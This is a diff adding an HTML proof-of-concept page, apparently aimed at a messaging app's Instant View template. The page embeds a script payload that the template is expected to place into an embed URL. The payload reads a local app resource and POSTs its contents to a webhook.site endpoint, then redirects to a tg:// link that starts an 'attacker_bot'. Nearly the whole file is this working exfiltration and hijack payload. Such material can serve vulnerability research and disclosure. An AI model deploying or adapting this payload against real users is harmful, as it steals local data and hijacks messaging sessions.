@@ -1,0 +1,24 @@
+ <!doctype html>
+    <html>
+      <head><title>Breaking news!</title>
+            <meta property="og:type" content="article"></head>
+      <body>
+        <h1>Breaking news!</h1>
+        <div id="embed"></div>
+        <!-- The IV template below will pick up <div id="embed">
+             and emit a pageBlockEmbed whose `url` field is the
+             attacker-chosen payload below. -->
+        <script type="text/iv-payload">
+          &lt;script&gt;
+            /* this is the PAYLOAD the IV template will place
+               verbatim in pageBlockEmbed.url */
+            fetch('http://desktop-app-resource/iv/page0.html')
+              .then(r=>r.text())
+              .then(t=>fetch('https://webhook.site/94956044-b49a-4b8b-9985-106e72a979a0',
+                             {method:'POST',body:t}));
+            window.location =
+              'tg://resolve?domain=attacker_bot&start=hijacked';
+          &lt;/script&gt;
+        </script>
+      </body>
+    </html>
